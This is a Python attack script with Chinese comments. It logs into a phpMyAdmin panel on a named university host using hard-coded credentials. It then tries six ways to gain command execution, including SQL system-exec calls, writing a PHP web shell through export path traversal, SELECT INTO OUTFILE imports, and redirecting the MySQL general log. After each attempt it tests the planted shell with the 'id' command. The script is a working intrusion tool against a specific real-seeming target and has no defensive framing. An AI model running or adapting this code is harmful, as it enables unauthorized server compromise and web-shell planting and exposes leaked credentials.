#!/usr/bin/env python3
import requests
import re
import urllib3
import time
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "https://olympic.su.ac.th/phpmyadmin/"
session = requests.Session()
session.verify = False

# 登录
login_data = {"pma_username": "mysql", "pma_password": "Mu123.123.", "server": "1"}
resp = session.post(url + "index.php", data=login_data, allow_redirects=True)
token = re.search(r'token=([a-f0-9]+)', resp.text).group(1)

print(f"[+] Token: {token}")

# 方法1: 通过phpMyAdmin的SQL执行系统命令（如果支持）
print("[*] 方法1: 尝试通过SQL执行系统命令...")
# 某些MySQL版本支持系统命令
sql_cmds = [
    "SELECT sys_exec('id');",
    "SELECT sys_eval('id');",
    "SELECT @@plugin_dir;",
]

for sql_cmd in sql_cmds:
    sql_data = {"sql_query": sql_cmd, "db": "mysql"}
    resp = session.post(url + "server_sql.php", params={"token": token, "db": "mysql"}, data=sql_data, verify=False, timeout=5)
    if "uid=" in resp.text or "gid=" in resp.text:
        print(f"[+] 命令执行成功: {sql_cmd}")
        exit(0)

# 方法2: 通过phpMyAdmin的临时文件写入shell
print("[*] 方法2: phpMyAdmin临时文件...")
# phpMyAdmin可能创建临时文件，尝试控制文件名和内容

# 方法3: 通过phpMyAdmin的导出功能，导出包含shell的SQL
print("[*] 方法3: 导出功能写入文件...")
# 创建表
sql_create = "CREATE TABLE IF NOT EXISTS scmeeting.shell(code TEXT);"
sql_data = {"sql_query": sql_create, "db": "scmeeting"}
session.post(url + "db_sql.php", params={"token": token, "db": "scmeeting"}, data=sql_data, verify=False)

sql_insert = "INSERT INTO scmeeting.shell VALUES('<?php system($_GET[\"c\"]); ?>');"
sql_data = {"sql_query": sql_insert, "db": "scmeeting"}
session.post(url + "db_sql.php", params={"token": token, "db": "scmeeting"}, data=sql_data, verify=False)

# 尝试导出
export_data = {
    "token": token,
    "db": "scmeeting",
    "table": "shell",
    "export_type": "sql",
    "what": "sql",
    "sql_query": "SELECT code FROM shell;",
    "asfile": "savefile",
    "filename_template": "../../../../var/www/html/enmeeting/shell.php",
}

export_resp = session.post(url + "db_export.php", params={"token": token, "db": "scmeeting"}, data=export_data, verify=False, timeout=10)

time.sleep(2)
test_shell = requests.get("https://olympic.su.ac.th/enmeeting/shell.php?c=id", verify=False, timeout=5)
if "uid=" in test_shell.text:
    print(f"[+] Shell获取成功: https://olympic.su.ac.th/enmeeting/shell.php?c=id")
    exit(0)

# 方法4: 通过phpMyAdmin的导入功能，导入包含shell的SQL文件
print("[*] 方法4: 导入功能执行SQL...")
import_content = """SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/html/enmeeting/shell.php';
"""
files = {"import_file": ("shell.sql", import_content, "application/sql")}
data = {"format": "sql", "token": token, "db": "scmeeting", "sql_compatibility": "NONE"}

import_resp = session.post(url + "db_import.php", params={"token": token, "db": "scmeeting"}, files=files, data=data, verify=False, timeout=10)

time.sleep(2)
test_shell = requests.get("https://olympic.su.ac.th/enmeeting/shell.php?c=id", verify=False, timeout=5)
if "uid=" in test_shell.text:
    print(f"[+] Shell获取成功(导入): https://olympic.su.ac.th/enmeeting/shell.php?c=id")
    exit(0)

# 方法5: 通过phpMyAdmin的setup功能写入配置文件
print("[*] 方法5: setup写入config...")
setup_url = url + "setup/"
setup_data = {
    "Servers/1/host": "localhost",
    "Servers/1/user": "root",
    "Servers/1/password": "",
    "Servers/1/auth_type": "config",
}

setup_resp = session.post(setup_url + "index.php", data=setup_data, verify=False, timeout=5)

# 方法6: 通过数据库日志写入到可访问位置
print("[*] 方法6: 数据库日志写入...")
log_paths = [
    "/var/www/html/enmeeting/log.php",
    "/var/www/html/log.php",
    "/var/www/enmeeting/log.php",
]

for log_path in log_paths:
    sql = f"SET GLOBAL general_log_file = '{log_path}';"
    sql_data = {"sql_query": sql, "db": "mysql"}
    session.post(url + "server_sql.php", params={"token": token, "db": "mysql"}, data=sql_data, verify=False)
    
    sql = "SET GLOBAL general_log = 'ON';"
    sql_data = {"sql_query": sql, "db": "mysql"}
    session.post(url + "server_sql.php", params={"token": token, "db": "mysql"}, data=sql_data, verify=False)
    
    sql = "SELECT '<?php system($_GET[\"c\"]); ?>';"
    sql_data = {"sql_query": sql, "db": "mysql"}
    session.post(url + "server_sql.php", params={"token": token, "db": "mysql"}, data=sql_data, verify=False)
    
    sql = "SET GLOBAL general_log = 'OFF';"
    sql_data = {"sql_query": sql, "db": "mysql"}
    session.post(url + "server_sql.php", params={"token": token, "db": "mysql"}, data=sql_data, verify=False)
    
    time.sleep(1)
    http_path = log_path.replace("/var/www/html", "")
    test_url = f"https://olympic.su.ac.th{http_path}?c=id"
    test_resp = requests.get(test_url, verify=False, timeout=5)
    if "uid=" in test_resp.text:
        print(f"[+] Shell获取成功: {test_url}")
        exit(0)

print("[-] 继续尝试其他方法...")
